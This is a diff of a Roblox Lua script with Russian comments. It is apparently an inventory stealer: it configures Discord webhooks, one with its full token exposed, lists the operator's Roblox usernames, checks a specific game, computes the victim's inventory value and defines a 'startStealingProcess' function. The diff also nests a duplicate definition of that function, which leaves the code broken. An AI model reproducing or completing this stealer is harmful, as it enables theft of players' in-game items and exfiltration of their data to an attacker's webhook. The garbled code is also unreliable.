@@ -1,4 +1,4 @@
-local Webhook = "https://discord.com/api/webhooks/1401379487672827904/NSdz5Jn-rvUh0mymSsuO29pOuWIvbmgwdwbzY8C8rd8wVvtLKOgk9ZvuaHtQYqFJKND9" --вебхук дискорда если не знаешь как посмотри видосики
+local Webhook = "https://discord.com/api/webhooks/...2" --вебхук дискорда если не знаешь как посмотри видосики
 
 local Username = {
 "roblox1", "roblox2" --твой ник в роблокс который начинается с '@' но не надо писать '@'
@@ -12,7 +12,7 @@ if game.PlaceId ~= 126884695634066 then
 end
 
 
-getgenv().BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo" -- без USERNAME
+local BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo" -- без USERNAME
 
 
 
@@ -233,11 +233,15 @@ local inventoryValue = getInventoryValue()
 
 -- 🔧 startStealingProcess ВЫНЕСЕНА ВВЕРХ
 local function startStealingProcess()
+    local scriptAlreadyRan = false
+
+local function startStealingProcess()
     if scriptAlreadyRan then
         warn("⚠️ ScriptAlreadyRun.")
         return
     end
     scriptAlreadyRan = true
+
 
     repeat task.wait() until game:IsLoaded()
 
